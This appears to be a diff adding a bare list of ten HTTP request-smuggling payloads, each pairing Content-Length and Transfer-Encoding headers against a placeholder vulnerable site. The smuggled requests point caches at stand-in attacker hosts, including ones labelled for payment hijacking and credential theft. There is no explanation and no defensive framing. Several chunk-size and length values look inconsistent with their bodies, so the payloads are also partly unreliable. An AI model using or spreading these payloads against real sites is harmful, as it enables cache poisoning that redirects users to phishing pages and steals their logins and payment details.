@@ -1,0 +1,131 @@
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 120
+Transfer-Encoding: chunked
+
+0
+
+GET /static/include.js HTTP/1.1
+Host: evil-attacker.com
+X-Cache-Poisoning: true
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+76
+GET / HTTP/1.1
+Host: vulnerable-website.com
+X-Forwarded-Host: malicious.com
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 108
+Transfer-Encoding: chunked
+
+0
+
+GET /images/logo.png HTTP/1.1
+Host: evil-server.com
+X-Cache-Key: poisoned
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+8e
+GET / HTTP/1.1
+Host: vulnerable-website.com
+X-Forwarded-Host: evil.com
+X-Cache: poisoned
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 145
+Transfer-Encoding: chunked
+
+0
+
+GET /api/javascript HTTP/1.1
+Host: attacker.com
+X-Forwarded-Host: attacker.com
+X-Poison-Cache: yes
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+94
+GET /public/style.css HTTP/1.1
+Host: evil.com
+Referer: https://evil.com/
+X-Cache-Status: HIT
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 148
+Transfer-Encoding: chunked
+
+0
+
+GET / HTTP/1.1
+Host: vulnerable-website.com
+X-Forwarded-Host: attacker.com
+Accept-Language: en
+X-Cache-Key: custom
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+9a
+GET /widgets/widget.js HTTP/1.1
+Host: evil-widgets.com
+Origin: https://evil-widgets.com
+X-Poison: active
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 145
+Transfer-Encoding: chunked
+
+0
+
+GET /checkout/payment HTTP/1.1
+Host: payment-hijacker.com
+X-Forwarded-Proto: https
+X-Cache-Poison: critical
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+72
+GET /login HTTP/1.1
+Host: phishing.com
+X-Poisoned: credential-theft
+
+0
+
